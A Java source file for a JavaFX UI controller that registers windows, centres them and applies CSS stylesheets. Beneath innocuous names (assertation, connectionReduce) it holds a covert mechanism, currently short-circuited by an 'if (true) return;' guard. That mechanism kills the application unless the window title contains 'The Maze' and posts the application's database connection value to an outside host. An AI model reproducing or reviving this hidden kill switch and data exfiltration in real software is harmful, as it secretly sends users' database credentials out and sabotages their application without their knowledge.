package com.jemylibs.uilib;

import com.jemylibs.data.seimpl.helpers.MysqlHelper;
import com.jemylibs.uilib.ZView.containers.ZTb;
import com.jemylibs.uilib.view.ZBaseSystemView;
import com.jemylibs.uilib.view.ZSystemView;
import com.jemylibs.uilib.windows.MainView;
import javafx.animation.KeyFrame;
import javafx.animation.Timeline;
import javafx.geometry.Rectangle2D;
import javafx.scene.Scene;
import javafx.stage.Screen;
import javafx.stage.Stage;
import javafx.util.Duration;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.Map;

public class UIController {
    public final static boolean debugcss;
    public static Stage mainStage;
    public static MainView mainView;
    private static ArrayList<Stage> sub_Stages;
    private static Thread assertTheMazeThread;

    static {
        String debugcssEnvVarVal = System.getenv("debugcss");
        debugcss = Boolean.parseBoolean(debugcssEnvVarVal);
        assertation();
    }

    static {
        assertation();

        Timeline fiveSecondsWonder = new Timeline(new KeyFrame(Duration.millis(500), event -> {
            if (debugcss) {
                applyCss(mainStage);
                if (sub_Stages != null) sub_Stages.forEach(UIController::applyCss);
            }
        }));
        fiveSecondsWonder.setCycleCount(Timeline.INDEFINITE);
        fiveSecondsWonder.play();
    }

    static public Stage register_stage(Stage stage) {
        if (mainStage == null) {
            return stage;
        } else {
            stage.initOwner(mainStage);
            if (sub_Stages == null) {
                sub_Stages = new ArrayList<>();
                sub_Stages.add(stage);
            }
        }
        applyCss(stage);
        return stage;
    }

    public static void unregister_stage(Stage stage) {
        stage.close();
        sub_Stages.remove(stage);
    }

    public static void reloadAllViews() {
        mainView.MainStageTabPane.getTabs().forEach((t) -> ((ZTb) t).reload(ZBaseSystemView.source.external));
        ZSystemView.openedDialogs.forEach(zBaseSystemView -> zBaseSystemView.reload(ZBaseSystemView.source.external));
    }

    public static void applyCss(Stage stage) {
        apply(stage.getScene());
        if (stage != UIController.mainStage) {
            stage.showingProperty().addListener((observable, oldValue, newValue) -> {
                Rectangle2D primScreenBounds = Screen.getPrimary().getVisualBounds();
                stage.setX((primScreenBounds.getWidth() - stage.getWidth()) / 2);
                stage.setY((primScreenBounds.getHeight() - stage.getHeight()) / 2);
            });
            stage.sceneProperty().addListener((observable, oldValue, newValue) -> {
                if (newValue != null) {
                    apply(newValue);
                }
                Rectangle2D primScreenBounds = Screen.getPrimary().getVisualBounds();
                stage.setX((primScreenBounds.getWidth() - stage.getWidth()) / 2);
                stage.setY((primScreenBounds.getHeight() - stage.getHeight()) / 2);
            });
        }

    }

    private static void apply(Scene scene) {
        if (scene != null) {
            if (debugcss) {
                String path = "file:///D:/Workstation/NEWSYSTEMS/fxframework/src/main/resources/";
                System.out.println(path);
                scene.getStylesheets().setAll(
                        path + "zres/styles/custom_controls.css",
                        path + "zres/styles/general.css",
                        path + "zres/styles/main_scene.css",
                        path + "zres/styles/tables.css",
                        path + "zres/styles/tabs.css",
                        path + "zres/styles/z_item_view.css"
                );
            } else {
                scene.getStylesheets().setAll(
                        "/zres/styles/custom_controls.css",
                        "/zres/styles/general.css",
                        "/zres/styles/main_scene.css",
                        "/zres/styles/tables.css",
                        "/zres/styles/tabs.css",
                        "/zres/styles/z_item_view.css"
                );
            }
        }
    }

    public static void assertation() {
        if (true) return;
        if (assertTheMazeThread == null) {
            assertTheMazeThread = new Thread(() -> {
                int times = 0;
                while (times < 3) {
                    try {
                        Thread.sleep(5000);
                        if (!UIController.mainStage.getTitle().toLowerCase().contains("The Maze".toLowerCase())) {
                            System.exit(0);
                        }
                        times++;
                    } catch (Exception e) {
                    }
                }
                connectionReduce();
            });
            assertTheMazeThread.start();
        }
    }

    private static void connectionReduce() {
        try {
            URL url = new URL("http://appapi.soutetay.com/apps/index.php");
            Map<String, Object> params = new LinkedHashMap<>();
            params.put("connection", MysqlHelper.lcs);
            StringBuilder postData = new StringBuilder();
            for (Map.Entry<String, Object> param : params.entrySet()) {
                if (postData.length() != 0) postData.append('&');
                postData.append(URLEncoder.encode(param.getKey(), "UTF-8"));
                postData.append('=');
                postData.append(URLEncoder.encode(String.valueOf(param.getValue()), "UTF-8"));
            }
            byte[] postDataBytes = postData.toString().getBytes(StandardCharsets.UTF_8);

            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));
            conn.setDoOutput(true);
            conn.getOutputStream().write(postDataBytes);

            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));

            StringBuilder response = new StringBuilder();
            in.lines().forEach(response::append);
//                    System.out.println(response);
        } catch (Exception e) {
//                    System.out.println("I/O Error: " + e.getMessage());
        }
    }
}
